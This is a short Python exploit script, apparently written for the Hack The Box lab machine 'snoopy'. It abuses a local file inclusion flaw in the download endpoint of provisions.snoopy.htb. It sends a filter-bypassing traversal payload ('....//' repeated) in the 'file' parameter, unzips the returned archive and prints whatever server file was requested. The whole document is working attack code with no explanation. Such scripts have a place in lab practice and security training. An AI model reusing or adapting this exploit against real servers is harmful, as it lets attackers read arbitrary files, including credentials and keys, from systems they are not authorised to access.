import argparse
import requests
import zipfile
import io
from colorama import Fore, Style

def lfi(path):
    try:
        url = "http://provisions.snoopy.htb/download"
        params = {"file": f"....//....//....//....//....//....//....//....//....//....//....//..../{path}"}
        r = requests.get(url, params=params)
        
        if r.status_code == 200:
            with zipfile.ZipFile(io.BytesIO(r.content)) as zip_file:
                for member in zip_file.namelist():
                    with zip_file.open(member) as file:
                        content = file.read().decode('utf-8')
                        print(Fore.BLUE + f"File: {member}")
                        print(Fore.GREEN + f"{content}\n" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"{path} not found." + Style.RESET_ALL)

    except zipfile.BadZipFile:
        print(Fore.RED + f"{path} is not a valid ZIP file." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"LFI Error: {e}" + Style.RESET_ALL)

def main():
    parser = argparse.ArgumentParser(description="LFI Script")
    parser.add_argument("zip_file", type=str, help="Path to the ZIP file")
    args = parser.parse_args()

    lfi(args.zip_file)

if __name__ == "__main__":
    main()